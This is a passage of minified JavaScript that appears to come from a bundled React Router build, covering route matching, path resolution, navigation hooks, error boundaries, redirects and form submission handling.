          t.routesMeta.map((e) => e.childrenIndex),
        )
      : t.score - e.score,
  );
}
var le = /^:[\w-]+$/,
  M = 3,
  N = 2,
  ue = 1,
  de = 10,
  fe = -2,
  pe = (e) => e === `*`;
function me(e, t) {
  let n = e.split(`/`),
    r = n.length;
  return (
    n.some(pe) && (r += fe),
    t && (r += N),
    n
      .filter((e) => !pe(e))
      .reduce((e, t) => e + (le.test(t) ? M : t === `` ? ue : de), r)
  );
}
function he(e, t) {
  return e.length === t.length && e.slice(0, -1).every((e, n) => e === t[n])
    ? e[e.length - 1] - t[t.length - 1]
    : 0;
}
function ge(e, t, n = !1) {
  let { routesMeta: r } = e,
    i = {},
    a = `/`,
    o = [];
  for (let e = 0; e < r.length; ++e) {
    let s = r[e],
      c = e === r.length - 1,
      l = a === `/` ? t : t.slice(a.length) || `/`,
      u = _e(
        { path: s.relativePath, caseSensitive: s.caseSensitive, end: c },
        l,
      ),
      d = s.route;
    if (
      (!u &&
        c &&
        n &&
        !r[r.length - 1].route.index &&
        (u = _e(
          { path: s.relativePath, caseSensitive: s.caseSensitive, end: !1 },
          l,
        )),
      !u)
    )
      return null;
    (Object.assign(i, u.params),
      o.push({
        params: i,
        pathname: ke([a, u.pathname]),
        pathnameBase: je(ke([a, u.pathnameBase])),
        route: d,
      }),
      u.pathnameBase !== `/` && (a = ke([a, u.pathnameBase])));
  }
  return o;
}
function _e(e, t) {
  typeof e == `string` && (e = { path: e, caseSensitive: !1, end: !0 });
  let [n, r] = ve(e.path, e.caseSensitive, e.end),
    i = t.match(n);
  if (!i) return null;
  let a = i[0],
    o = a.replace(/(.)\/+$/, `$1`),
    s = i.slice(1);
  return {
    params: r.reduce((e, { paramName: t, isOptional: n }, r) => {
      if (t === `*`) {
        let e = s[r] || ``;
        o = a.slice(0, a.length - e.length).replace(/(.)\/+$/, `$1`);
      }
      let i = s[r];
      return (
        n && !i ? (e[t] = void 0) : (e[t] = (i || ``).replace(/%2F/g, `/`)),
        e
      );
    }, {}),
    pathname: a,
    pathnameBase: o,
    pattern: e,
  };
}
function ve(e, t = !1, n = !0) {
  E(
    e === `*` || !e.endsWith(`*`) || e.endsWith(`/*`),
    `Route path "${e}" will be treated as if it were "${e.replace(/\*$/, `/*`)}" because the \`*\` character must always follow a \`/\` in the pattern. To get rid of this warning, please change the route path to "${e.replace(/\*$/, `/*`)}".`,
  );
  let r = [],
    i =
      `^` +
      e
        .replace(/\/*\*?$/, ``)
        .replace(/^\/*/, `/`)
        .replace(/[\\.*+^${}|()[\]]/g, `\\$&`)
        .replace(/\/:([\w-]+)(\?)?/g, (e, t, n, i, a) => {
          if ((r.push({ paramName: t, isOptional: n != null }), n)) {
            let t = a.charAt(i + e.length);
            return t && t !== `/` ? `/([^\\/]*)` : `(?:/([^\\/]*))?`;
          }
          return `/([^\\/]+)`;
        })
        .replace(/\/([\w-]+)\?(\/|$)/g, `(/$1)?$2`);
  return (
    e.endsWith(`*`)
      ? (r.push({ paramName: `*` }),
        (i += e === `*` || e === `/*` ? `(.*)$` : `(?:\\/(.+)|\\/*)$`))
      : n
        ? (i += `\\/*$`)
        : e !== `` && e !== `/` && (i += `(?:(?=\\/|$))`),
    [new RegExp(i, t ? void 0 : `i`), r]
  );
}
function ye(e) {
  try {
    return e
      .split(`/`)
      .map((e) => decodeURIComponent(e).replace(/\//g, `%2F`))
      .join(`/`);
  } catch (t) {
    return (
      E(
        !1,
        `The URL path "${e}" could not be decoded because it is a malformed URL segment. This is probably due to a bad percent encoding (${t}).`,
      ),
      e
    );
  }
}
function be(e, t) {
  if (t === `/`) return e;
  if (!e.toLowerCase().startsWith(t.toLowerCase())) return null;
  let n = t.endsWith(`/`) ? t.length - 1 : t.length,
    r = e.charAt(n);
  return r && r !== `/` ? null : e.slice(n) || `/`;
}
var xe = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i;
function Se(e, t = `/`) {
  let {
      pathname: n,
      search: r = ``,
      hash: i = ``,
    } = typeof e == `string` ? re(e) : e,
    a;
  return (
    n
      ? ((n = Oe(n)),
        (a = n.startsWith(`/`) ? Ce(n.substring(1), `/`) : Ce(n, t)))
      : (a = t),
    { pathname: a, search: Me(r), hash: Ne(i) }
  );
}
function Ce(e, t) {
  let n = Ae(t).split(`/`);
  return (
    e.split(`/`).forEach((e) => {
      e === `..` ? n.length > 1 && n.pop() : e !== `.` && n.push(e);
    }),
    n.length > 1 ? n.join(`/`) : `/`
  );
}
function we(e, t, n, r) {
  return `Cannot include a '${e}' character in a manually specified \`to.${t}\` field [${JSON.stringify(r)}].  Please separate it out to the \`to.${n}\` field. Alternatively you may provide the full path as a string in <Link to="..."> and the router will parse it for you.`;
}
function Te(e) {
  return e.filter(
    (e, t) => t === 0 || (e.route.path && e.route.path.length > 0),
  );
}
function Ee(e) {
  let t = Te(e);
  return t.map((e, n) => (n === t.length - 1 ? e.pathname : e.pathnameBase));
}
function De(e, t, n, r = !1) {
  let i;
  typeof e == `string`
    ? (i = re(e))
    : ((i = { ...e }),
      T(
        !i.pathname || !i.pathname.includes(`?`),
        we(`?`, `pathname`, `search`, i),
      ),
      T(
        !i.pathname || !i.pathname.includes(`#`),
        we(`#`, `pathname`, `hash`, i),
      ),
      T(!i.search || !i.search.includes(`#`), we(`#`, `search`, `hash`, i)));
  let a = e === `` || i.pathname === ``,
    o = a ? `/` : i.pathname,
    s;
  if (o == null) s = n;
  else {
    let e = t.length - 1;
    if (!r && o.startsWith(`..`)) {
      let t = o.split(`/`);
      for (; t[0] === `..`; ) (t.shift(), --e);
      i.pathname = t.join(`/`);
    }
    s = e >= 0 ? t[e] : `/`;
  }
  let c = Se(i, s),
    l = o && o !== `/` && o.endsWith(`/`),
    u = (a || o === `.`) && n.endsWith(`/`);
  return (!c.pathname.endsWith(`/`) && (l || u) && (c.pathname += `/`), c);
}
var Oe = (e) => e.replace(/\/\/+/g, `/`),
  ke = (e) => Oe(e.join(`/`)),
  Ae = (e) => e.replace(/\/+$/, ``),
  je = (e) => Ae(e).replace(/^\/*/, `/`),
  Me = (e) => (!e || e === `?` ? `` : e.startsWith(`?`) ? e : `?` + e),
  Ne = (e) => (!e || e === `#` ? `` : e.startsWith(`#`) ? e : `#` + e),
  Pe = class {
    constructor(e, t, n, r = !1) {
      ((this.status = e),
        (this.statusText = t || ``),
        (this.internal = r),
        n instanceof Error
          ? ((this.data = n.toString()), (this.error = n))
          : (this.data = n));
    }
  };
function Fe(e) {
  return (
    e != null &&
    typeof e.status == `number` &&
    typeof e.statusText == `string` &&
    typeof e.internal == `boolean` &&
    `data` in e
  );
}
function Ie(e) {
  return ke(e.map((e) => e.route.path).filter(Boolean)) || `/`;
}
var Le =
  typeof window < `u` &&
  window.document !== void 0 &&
  window.document.createElement !== void 0;
function Re(e, t) {
  let n = e;
  if (typeof n != `string` || !xe.test(n))
    return { absoluteURL: void 0, isExternal: !1, to: n };
  let r = n,
    i = !1;
  if (Le)
    try {
      let e = new URL(window.location.href),
        r = n.startsWith(`//`) ? new URL(e.protocol + n) : new URL(n),
        a = be(r.pathname, t);
      r.origin === e.origin && a != null
        ? (n = a + r.search + r.hash)
        : (i = !0);
    } catch {
      E(
        !1,
        `<Link to="${n}"> contains an invalid URL which will probably break when clicked - please update to a valid URL path.`,
      );
    }
  return { absoluteURL: r, isExternal: i, to: n };
}
Object.getOwnPropertyNames(Object.prototype).sort().join(`\0`);
var ze = [`POST`, `PUT`, `PATCH`, `DELETE`];
new Set(ze);
var Be = [`GET`, ...ze];
new Set(Be);
var Ve = _.createContext(null);
Ve.displayName = `DataRouter`;
var He = _.createContext(null);
He.displayName = `DataRouterState`;
var Ue = _.createContext(!1);
function We() {
  return _.useContext(Ue);
}
var Ge = _.createContext({ isTransitioning: !1 });
Ge.displayName = `ViewTransition`;
var Ke = _.createContext(new Map());
Ke.displayName = `Fetchers`;
var qe = _.createContext(null);
qe.displayName = `Await`;
var Je = _.createContext(null);
Je.displayName = `Navigation`;
var Ye = _.createContext(null);
Ye.displayName = `Location`;
var Xe = _.createContext({ outlet: null, matches: [], isDataRoute: !1 });
Xe.displayName = `Route`;
var Ze = _.createContext(null);
Ze.displayName = `RouteError`;
var Qe = `REACT_ROUTER_ERROR`,
  $e = `REDIRECT`,
  et = `ROUTE_ERROR_RESPONSE`;
function tt(e) {
  if (e.startsWith(`${Qe}:${$e}:{`))
    try {
      let t = JSON.parse(e.slice(28));
      if (
        typeof t == `object` &&
        t &&
        typeof t.status == `number` &&
        typeof t.statusText == `string` &&
        typeof t.location == `string` &&
        typeof t.reloadDocument == `boolean` &&
        typeof t.replace == `boolean`
      )
        return t;
    } catch {}
}
function nt(e) {
  if (e.startsWith(`${Qe}:${et}:{`))
    try {
      let t = JSON.parse(e.slice(40));
      if (
        typeof t == `object` &&
        t &&
        typeof t.status == `number` &&
        typeof t.statusText == `string`
      )
        return new Pe(t.status, t.statusText, t.data);
    } catch {}
}
function rt(e, { relative: t } = {}) {
  T(it(), `useHref() may be used only in the context of a <Router> component.`);
  let { basename: n, navigator: r } = _.useContext(Je),
    { hash: i, pathname: a, search: o } = ft(e, { relative: t }),
    s = a;
  return (
    n !== `/` && (s = a === `/` ? n : ke([n, a])),
    r.createHref({ pathname: s, search: o, hash: i })
  );
}
function it() {
  return _.useContext(Ye) != null;
}
function at() {
  return (
    T(
      it(),
      `useLocation() may be used only in the context of a <Router> component.`,
    ),
    _.useContext(Ye).location
  );
}
var ot = `You should call navigate() in a React.useEffect(), not when your component is first rendered.`;
function st(e) {
  _.useContext(Je).static || _.useLayoutEffect(e);
}
function ct() {
  let { isDataRoute: e } = _.useContext(Xe);
  return e ? jt() : lt();
}
function lt() {
  T(
    it(),
    `useNavigate() may be used only in the context of a <Router> component.`,
  );
  let e = _.useContext(Ve),
    { basename: t, navigator: n } = _.useContext(Je),
    { matches: r } = _.useContext(Xe),
    { pathname: i } = at(),
    a = JSON.stringify(Ee(r)),
    o = _.useRef(!1);
  return (
    st(() => {
      o.current = !0;
    }),
    _.useCallback(
      (r, s = {}) => {
        if ((E(o.current, ot), !o.current)) return;
        if (typeof r == `number`) {
          n.go(r);
          return;
        }
        let c = De(r, JSON.parse(a), i, s.relative === `path`);
        (e == null &&
          t !== `/` &&
          (c.pathname = c.pathname === `/` ? t : ke([t, c.pathname])),
          (s.replace ? n.replace : n.push)(c, s.state, s));
      },
      [t, n, a, i, e],
    )
  );
}
var ut = _.createContext(null);
function dt(e) {
  let t = _.useContext(Xe).outlet;
  return _.useMemo(
    () => t && _.createElement(ut.Provider, { value: e }, t),
    [t, e],
  );
}
function ft(e, { relative: t } = {}) {
  let { matches: n } = _.useContext(Xe),
    { pathname: r } = at(),
    i = JSON.stringify(Ee(n));
  return _.useMemo(() => De(e, JSON.parse(i), r, t === `path`), [e, i, r, t]);
}
function pt(e, t) {
  return mt(e, t);
}
function mt(e, t, n) {
  T(
    it(),
    `useRoutes() may be used only in the context of a <Router> component.`,
  );
  let { navigator: r } = _.useContext(Je),
    { matches: i } = _.useContext(Xe),
    a = i[i.length - 1],
    o = a ? a.params : {},
    s = a ? a.pathname : `/`,
    c = a ? a.pathnameBase : `/`,
    l = a && a.route;
  {
    let e = (l && l.path) || ``;
    Nt(
      s,
      !l || e.endsWith(`*`) || e.endsWith(`*?`),
      `You rendered descendant <Routes> (or called \`useRoutes()\`) at "${s}" (under <Route path="${e}">) but the parent route path has no trailing "*". This means if you navigate deeper, the parent won't match anymore and therefore the child routes will never render.

Please change the parent <Route path="${e}"> to <Route path="${e === `/` ? `*` : `${e}/*`}">.`,
    );
  }
  let u = at(),
    d;
  if (t) {
    let e = typeof t == `string` ? re(t) : t;
    (T(
      c === `/` || e.pathname?.startsWith(c),
      `When overriding the location using \`<Routes location>\` or \`useRoutes(routes, location)\`, the location pathname must begin with the portion of the URL pathname that was matched by all parent routes. The current pathname base is "${c}" but pathname "${e.pathname}" was given in the \`location\` prop.`,
    ),
      (d = e));
  } else d = u;
  let f = d.pathname || `/`,
    p = f;
  if (c !== `/`) {
    let e = c.replace(/^\//, ``).split(`/`);
    p = `/` + f.replace(/^\//, ``).split(`/`).slice(e.length).join(`/`);
  }
  let m = ae(e, { pathname: p });
  (E(
    l || m != null,
    `No routes matched location "${d.pathname}${d.search}${d.hash}" `,
  ),
    E(
      m == null ||
        m[m.length - 1].route.element !== void 0 ||
        m[m.length - 1].route.Component !== void 0 ||
        m[m.length - 1].route.lazy !== void 0,
      `Matched leaf route at location "${d.pathname}${d.search}${d.hash}" does not have an element or Component. This means it will render an <Outlet /> with a null value by default resulting in an "empty" page.`,
    ));
  let h = xt(
    m &&
      m.map((e) =>
        Object.assign({}, e, {
          params: Object.assign({}, o, e.params),
          pathname: ke([
            c,
            r.encodeLocation
              ? r.encodeLocation(
                  e.pathname
                    .replace(/%/g, `%25`)
                    .replace(/\?/g, `%3F`)
                    .replace(/#/g, `%23`),
                ).pathname
              : e.pathname,
          ]),
          pathnameBase:
            e.pathnameBase === `/`
              ? c
              : ke([
                  c,
                  r.encodeLocation
                    ? r.encodeLocation(
                        e.pathnameBase
                          .replace(/%/g, `%25`)
                          .replace(/\?/g, `%3F`)
                          .replace(/#/g, `%23`),
                      ).pathname
                    : e.pathnameBase,
                ]),
        }),
      ),
    i,
    n,
  );
  return t && h
    ? _.createElement(
        Ye.Provider,
        {
          value: {
            location: {
              pathname: `/`,
              search: ``,
              hash: ``,
              state: null,
              key: `default`,
              unstable_mask: void 0,
              ...d,
            },
            navigationType: `POP`,
          },
        },
        h,
      )
    : h;
}
function ht() {
  let e = At(),
    t = Fe(e)
      ? `${e.status} ${e.statusText}`
      : e instanceof Error
        ? e.message
        : JSON.stringify(e),
    n = e instanceof Error ? e.stack : null,
    r = `rgba(200,200,200, 0.5)`,
    i = { padding: `0.5rem`, backgroundColor: r },
    a = { padding: `2px 4px`, backgroundColor: r },
    o = null;
  return (
    console.error(`Error handled by React Router default ErrorBoundary:`, e),
    (o = _.createElement(
      _.Fragment,
      null,
      _.createElement(`p`, null, `💿 Hey developer 👋`),
      _.createElement(
        `p`,
        null,
        `You can provide a way better UX than this when your app throws errors by providing your own `,
        _.createElement(`code`, { style: a }, `ErrorBoundary`),
        ` or`,
        ` `,
        _.createElement(`code`, { style: a }, `errorElement`),
        ` prop on your route.`,
      ),
    )),
    _.createElement(
      _.Fragment,
      null,
      _.createElement(`h2`, null, `Unexpected Application Error!`),
      _.createElement(`h3`, { style: { fontStyle: `italic` } }, t),
      n ? _.createElement(`pre`, { style: i }, n) : null,
      o,
    )
  );
}
var gt = _.createElement(ht, null),
  _t = class extends _.Component {
    constructor(e) {
      (super(e),
        (this.state = {
          location: e.location,
          revalidation: e.revalidation,
          error: e.error,
        }));
    }
    static getDerivedStateFromError(e) {
      return { error: e };
    }
    static getDerivedStateFromProps(e, t) {
      return t.location !== e.location ||
        (t.revalidation !== `idle` && e.revalidation === `idle`)
        ? { error: e.error, location: e.location, revalidation: e.revalidation }
        : {
            error: e.error === void 0 ? t.error : e.error,
            location: t.location,
            revalidation: e.revalidation || t.revalidation,
          };
    }
    componentDidCatch(e, t) {
      this.props.onError
        ? this.props.onError(e, t)
        : console.error(
            `React Router caught the following error during render`,
            e,
          );
    }
    render() {
      let e = this.state.error;
      if (
        this.context &&
        typeof e == `object` &&
        e &&
        `digest` in e &&
        typeof e.digest == `string`
      ) {
        let t = nt(e.digest);
        t && (e = t);
      }
      let t =
        e === void 0
          ? this.props.children
          : _.createElement(
              Xe.Provider,
              { value: this.props.routeContext },
              _.createElement(Ze.Provider, {
                value: e,
                children: this.props.component,
              }),
            );
      return this.context ? _.createElement(yt, { error: e }, t) : t;
    }
  };
_t.contextType = Ue;
var vt = new WeakMap();
function yt({ children: e, error: t }) {
  let { basename: n } = _.useContext(Je);
  if (
    typeof t == `object` &&
    t &&
    `digest` in t &&
    typeof t.digest == `string`
  ) {
    let e = tt(t.digest);
    if (e) {
      let r = vt.get(t);
      if (r) throw r;
      let i = Re(e.location, n);
      if (Le && !vt.get(t))
        if (i.isExternal || e.reloadDocument)
          window.location.href = i.absoluteURL || i.to;
        else {
          let n = Promise.resolve().then(() =>
            window.__reactRouterDataRouter.navigate(i.to, {
              replace: e.replace,
            }),
          );
          throw (vt.set(t, n), n);
        }
      return _.createElement(`meta`, {
        httpEquiv: `refresh`,
        content: `0;url=${i.absoluteURL || i.to}`,
      });
    }
  }
  return e;
}
function bt({ routeContext: e, match: t, children: n }) {
  let r = _.useContext(Ve);
  return (
    r &&
      r.static &&
      r.staticContext &&
      (t.route.errorElement || t.route.ErrorBoundary) &&
      (r.staticContext._deepestRenderedBoundaryId = t.route.id),
    _.createElement(Xe.Provider, { value: e }, n)
  );
}
function xt(e, t = [], n) {
  let r = n?.state;
  if (e == null) {
    if (!r) return null;
    if (r.errors) e = r.matches;
    else if (t.length === 0 && !r.initialized && r.matches.length > 0)
      e = r.matches;
    else return null;
  }
  let i = e,
    a = r?.errors;
  if (a != null) {
    let e = i.findIndex((e) => e.route.id && a?.[e.route.id] !== void 0);
    (T(
      e >= 0,
      `Could not find a matching route for errors on route IDs: ${Object.keys(a).join(`,`)}`,
    ),
      (i = i.slice(0, Math.min(i.length, e + 1))));
  }
  let o = !1,
    s = -1;
  if (n && r) {
    o = r.renderFallback;
    for (let e = 0; e < i.length; e++) {
      let t = i[e];
      if (
        ((t.route.HydrateFallback || t.route.hydrateFallbackElement) && (s = e),
        t.route.id)
      ) {
        let { loaderData: e, errors: a } = r,
          c =
            t.route.loader &&
            !e.hasOwnProperty(t.route.id) &&
            (!a || a[t.route.id] === void 0);
        if (t.route.lazy || c) {
          (n.isStatic && (o = !0), (i = s >= 0 ? i.slice(0, s + 1) : [i[0]]));
          break;
        }
      }
    }
  }
  let c = n?.onError,
    l =
      r && c
        ? (e, t) => {
            c(e, {
              location: r.location,
              params: r.matches?.[0]?.params ?? {},
              unstable_pattern: Ie(r.matches),
              errorInfo: t,
            });
          }
        : void 0;
  return i.reduceRight((e, n, c) => {
    let u,
      d = !1,
      f = null,
      p = null;
    r &&
      ((u = a && n.route.id ? a[n.route.id] : void 0),
      (f = n.route.errorElement || gt),
      o &&
        (s < 0 && c === 0
          ? (Nt(
              `route-fallback`,
              !1,
              "No `HydrateFallback` element provided to render during initial hydration",
            ),
            (d = !0),
            (p = null))
          : s === c &&
            ((d = !0), (p = n.route.hydrateFallbackElement || null))));
    let m = t.concat(i.slice(0, c + 1)),
      h = () => {
        let t;
        return (
          (t = u
            ? f
            : d
              ? p
              : n.route.Component
                ? _.createElement(n.route.Component, null)
                : n.route.element
                  ? n.route.element
                  : e),
          _.createElement(bt, {
            match: n,
            routeContext: { outlet: e, matches: m, isDataRoute: r != null },
            children: t,
          })
        );
      };
    return r && (n.route.ErrorBoundary || n.route.errorElement || c === 0)
      ? _.createElement(_t, {
          location: r.location,
          revalidation: r.revalidation,
          component: f,
          error: u,
          children: h(),
          routeContext: { outlet: null, matches: m, isDataRoute: !0 },
          onError: l,
        })
      : h();
  }, null);
}
function St(e) {
  return `${e} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`;
}
function Ct(e) {
  let t = _.useContext(Ve);
  return (T(t, St(e)), t);
}
function wt(e) {
  let t = _.useContext(He);
  return (T(t, St(e)), t);
}
function Tt(e) {
  let t = _.useContext(Xe);
  return (T(t, St(e)), t);
}
function Et(e) {
  let t = Tt(e),
    n = t.matches[t.matches.length - 1];
  return (
    T(n.route.id, `${e} can only be used on routes that contain a unique "id"`),
    n.route.id
  );
}
function Dt() {
  return Et(`useRouteId`);
}
function Ot() {
  return wt(`useNavigation`).navigation;
}
function kt() {
  let { matches: e, loaderData: t } = wt(`useMatches`);
  return _.useMemo(() => e.map((e) => j(e, t)), [e, t]);
}
function At() {
  let e = _.useContext(Ze),
    t = wt(`useRouteError`),
    n = Et(`useRouteError`);
  return e === void 0 ? t.errors?.[n] : e;
}
function jt() {
  let { router: e } = Ct(`useNavigate`),
    t = Et(`useNavigate`),
    n = _.useRef(!1);
  return (
    st(() => {
      n.current = !0;
    }),
    _.useCallback(
      async (r, i = {}) => {
        (E(n.current, ot),
          n.current &&
            (typeof r == `number`
              ? await e.navigate(r)
              : await e.navigate(r, { fromRouteId: t, ...i })));
      },
      [e, t],
    )
  );
}
var Mt = {};
function Nt(e, t, n) {
  !t && !Mt[e] && ((Mt[e] = !0), E(!1, n));
}
(_.useOptimistic, _.memo(Pt));
function Pt({ routes: e, future: t, state: n, isStatic: r, onError: i }) {
  return mt(e, void 0, { state: n, isStatic: r, onError: i, future: t });
}
function Ft({ to: e, replace: t, state: n, relative: r }) {
  T(
    it(),
    `<Navigate> may be used only in the context of a <Router> component.`,
  );
  let { static: i } = _.useContext(Je);
  E(
    !i,
    `<Navigate> must not be used on the initial render in a <StaticRouter>. This is a no-op, but you should modify your code so the <Navigate> is only ever rendered in response to some user interaction or state change.`,
  );
  let { matches: a } = _.useContext(Xe),
    { pathname: o } = at(),
    s = ct(),
    c = De(e, Ee(a), o, r === `path`),
    l = JSON.stringify(c);
  return (
    _.useEffect(() => {
      s(JSON.parse(l), { replace: t, state: n, relative: r });
    }, [s, l, r, t, n]),
    null
  );
}
function It(e) {
  return dt(e.context);
}
function Lt(e) {
  T(
    !1,
    `A <Route> is only ever to be used as the child of <Routes> element, never rendered directly. Please wrap your <Route> in a <Routes>.`,
  );
}
function Rt({
  basename: e = `/`,
  children: t = null,
  location: n,
  navigationType: r = `POP`,
  navigator: i,
  static: a = !1,
  unstable_useTransitions: o,
}) {
  T(
    !it(),
    `You cannot render a <Router> inside another <Router>. You should never have more than one in your app.`,
  );
  let s = e.replace(/^\/*/, `/`),
    c = _.useMemo(
      () => ({
        basename: s,
        navigator: i,
        static: a,
        unstable_useTransitions: o,
        future: {},
      }),
      [s, i, a, o],
    );
  typeof n == `string` && (n = re(n));
  let {
      pathname: l = `/`,
      search: u = ``,
      hash: d = ``,
      state: f = null,
      key: p = `default`,
      unstable_mask: m,
    } = n,
    h = _.useMemo(() => {
      let e = be(l, s);
      return e == null
        ? null
        : {
            location: {
              pathname: e,
              search: u,
              hash: d,
              state: f,
              key: p,
              unstable_mask: m,
            },
            navigationType: r,
          };
    }, [s, l, u, d, f, p, r, m]);
  return (
    E(
      h != null,
      `<Router basename="${s}"> is not able to match the URL "${l}${u}${d}" because it does not start with the basename, so the <Router> won't render anything.`,
    ),
    h == null
      ? null
      : _.createElement(
          Je.Provider,
          { value: c },
          _.createElement(Ye.Provider, { children: t, value: h }),
        )
  );
}
function zt({ children: e, location: t }) {
  return pt(Bt(e), t);
}
_.Component;
function Bt(e, t = []) {
  let n = [];
  return (
    _.Children.forEach(e, (e, r) => {
      if (!_.isValidElement(e)) return;
      let i = [...t, r];
      if (e.type === _.Fragment) {
        n.push.apply(n, Bt(e.props.children, i));
        return;
      }
      (T(
        e.type === Lt,
        `[${typeof e.type == `string` ? e.type : e.type.name}] is not a <Route> component. All component children of <Routes> must be a <Route> or <React.Fragment>`,
      ),
        T(
          !e.props.index || !e.props.children,
          `An index route cannot have child routes.`,
        ));
      let a = {
        id: e.props.id || i.join(`-`),
        caseSensitive: e.props.caseSensitive,
        element: e.props.element,
        Component: e.props.Component,
        index: e.props.index,
        path: e.props.path,
        middleware: e.props.middleware,
        loader: e.props.loader,
        action: e.props.action,
        hydrateFallbackElement: e.props.hydrateFallbackElement,
        HydrateFallback: e.props.HydrateFallback,
        errorElement: e.props.errorElement,
        ErrorBoundary: e.props.ErrorBoundary,
        hasErrorBoundary:
          e.props.hasErrorBoundary === !0 ||
          e.props.ErrorBoundary != null ||
          e.props.errorElement != null,
        shouldRevalidate: e.props.shouldRevalidate,
        handle: e.props.handle,
        lazy: e.props.lazy,
      };
      (e.props.children && (a.children = Bt(e.props.children, i)), n.push(a));
    }),
    n
  );
}
var Vt = `get`,
  Ht = `application/x-www-form-urlencoded`;
function Ut(e) {
  return typeof HTMLElement < `u` && e instanceof HTMLElement;
}
function Wt(e) {
  return Ut(e) && e.tagName.toLowerCase() === `button`;
}
function Gt(e) {
  return Ut(e) && e.tagName.toLowerCase() === `form`;
}
function Kt(e) {
  return Ut(e) && e.tagName.toLowerCase() === `input`;
}
function qt(e) {
  return !!(e.metaKey || e.altKey || e.ctrlKey || e.shiftKey);
}
function Jt(e, t) {
  return e.button === 0 && (!t || t === `_self`) && !qt(e);
}
var Yt = null;
function Xt() {
  if (Yt === null)
    try {
      (new FormData(document.createElement(`form`), 0), (Yt = !1));
    } catch {
      Yt = !0;
    }
  return Yt;
}
var Zt = new Set([
  `application/x-www-form-urlencoded`,
  `multipart/form-data`,
  `text/plain`,
]);
function Qt(e) {
  return e != null && !Zt.has(e)
    ? (E(
        !1,
        `"${e}" is not a valid \`encType\` for \`<Form>\`/\`<fetcher.Form>\` and will default to "${Ht}"`,
      ),
      null)
    : e;
}
function $t(e, t) {
  let n, r, i, a, o;
  if (Gt(e)) {
    let o = e.getAttribute(`action`);
    ((r = o ? be(o, t) : null),
      (n = e.getAttribute(`method`) || Vt),
      (i = Qt(e.getAttribute(`enctype`)) || Ht),
      (a = new FormData(e)));
  } else if (Wt(e) || (Kt(e) && (e.type === `submit` || e.type === `image`))) {
    let o = e.form;
    if (o == null)
      throw Error(
        `Cannot submit a <button> or <input type="submit"> without a <form>`,
      );
    let s = e.getAttribute(`formaction`) || o.getAttribute(`action`);
    if (
      ((r = s ? be(s, t) : null),
      (n = e.getAttribute(`formmethod`) || o.getAttribute(`method`) || Vt),
      (i =
        Qt(e.getAttribute(`formenctype`)) ||
        Qt(o.getAttribute(`enctype`)) ||
        Ht),
      (a = new FormData(o, e)),
      !Xt())
    ) {
      let { name: t, type: n, value: r } = e;
      if (n === `image`) {
        let e = t ? `${t}.` : ``;
        (a.append(`${e}x`, `0`), a.append(`${e}y`, `0`));
      } else t && a.append(t, r);
    }
  } else if (Ut(e))
    throw Error(
      `Cannot submit element that is not <form>, <button>, or <input type="submit|image">`,
    );
  else ((n = Vt), (r = null), (i = Ht), (o = e));
  return (
    a && i === `text/plain` && ((o = a), (a = void 0)),
    { action: r, method: n.toLowerCase(), encType: i, formData: a, body: o }
  );
}
Object.getOwnPropertyNames(Object.prototype).sort().join(`\0`);
var en = {
    "&": `\\u0026`,
    ">": `\\u003e`,
    "<": `\\u003c`,
    "\u2028": `\\u2028`,
    "\u2029": `\\u2029`,
  },
  tn = /[&><\u2028\u2029]/g;
function nn(e) {
  return e.replace(tn, (e) => en[e]);
}
function rn(e, t) {
  if (e === !1 || e == null) throw Error(t);
}
function an(e, t, n, r) {
  let i =
    typeof e == `string`
      ? new URL(
          e,
          typeof window > `u`
            ? `server://singlefetch/`
            : window.location.origin,
        )
      : e;
  return (
    n
      ? i.pathname.endsWith(`/`)
        ? (i.pathname = `${i.pathname}_.${r}`)
        : (i.pathname = `${i.pathname}.${r}`)
      : i.pathname === `/`
        ? (i.pathname = `_root.${r}`)
        : t && be(i.pathname, t) === `/`
          ? (i.pathname = `${Ae(t)}/_root.${r}`)
          : (i.pathname = `${Ae(i.pathname)}.${r}`),
    i
  );
}
async function on(e, t) {
  if (e.id in t) return t[e.id];
  try {
    let n = await S(() => import(e.module), []);
    return ((t[e.id] = n), n);
  } catch (t) {
    return (
      console.error(
        `Error loading route module \`${e.module}\`, reloading page...`,
      ),
      console.error(t),
      window.__reactRouterContext && window.__reactRouterContext.isSpaMode,
      window.location.reload(),
      new Promise(() => {})
    );
  }
}
function sn(e) {
  return e != null && typeof e.page == `string`;
}
function cn(e) {
  return e == null
    ? !1
    : e.href == null
      ? e.rel === `preload` &&
        typeof e.imageSrcSet == `string` &&
        typeof e.imageSizes == `string`
      : typeof e.rel == `string` && typeof e.href == `string`;
}
async function ln(e, t, n) {
  return mn(
    (
      await Promise.all(
        e.map(async (e) => {
          let r = t.routes[e.route.id];
          if (r) {
            let e = await on(r, n);
            return e.links ? e.links() : [];
          }
          return [];
        }),
      )
    )
      .flat(1)
      .filter(cn)
      .filter((e) => e.rel === `stylesheet` || e.rel === `preload`)
      .map((e) =>
        e.rel === `stylesheet`
          ? { ...e, rel: `prefetch`, as: `style` }
          : { ...e, rel: `prefetch` },
      ),
  );
}
function un(e, t, n, r, i, a) {
  let o = (e, t) => (n[t] ? e.route.id !== n[t].route.id : !0),
    s = (e, t) =>
      n[t].pathname !== e.pathname ||
      (n[t].route.path?.endsWith(`*`) && n[t].params[`*`] !== e.params[`*`]);
  return a === `assets`
    ? t.filter((e, t) => o(e, t) || s(e, t))
    : a === `data`
      ? t.filter((t, a) => {
          let c = r.routes[t.route.id];
          if (!c || !c.hasLoader) return !1;
          if (o(t, a) || s(t, a)) return !0;
          if (t.route.shouldRevalidate) {
            let r = t.route.shouldRevalidate({
              currentUrl: new URL(
                i.pathname + i.search + i.hash,
                window.origin,
              ),
              currentParams: n[0]?.params || {},
              nextUrl: new URL(e, window.origin),
              nextParams: t.params,
              defaultShouldRevalidate: !0,
            });
            if (typeof r == `boolean`) return r;
          }
          return !0;
        })
      : [];
}
function dn(e, t, { includeHydrateFallback: n } = {}) {
  return fn(
    e
      .map((e) => {
        let r = t.routes[e.route.id];
        if (!r) return [];
        let i = [r.module];
        return (
          r.clientActionModule && (i = i.concat(r.clientActionModule)),
          r.clientLoaderModule && (i = i.concat(r.clientLoaderModule)),
          n &&
            r.hydrateFallbackModule &&
            (i = i.concat(r.hydrateFallbackModule)),
          r.imports && (i = i.concat(r.imports)),
          i
        );
      })
      .flat(1),
  );
}
function fn(e) {
  return [...new Set(e)];
}
function pn(e) {
  let t = {},
    n = Object.keys(e).sort();
  for (let r of n) t[r] = e[r];
  return t;
}
function mn(e, t) {
  let n = new Set(),
    r = new Set(t);
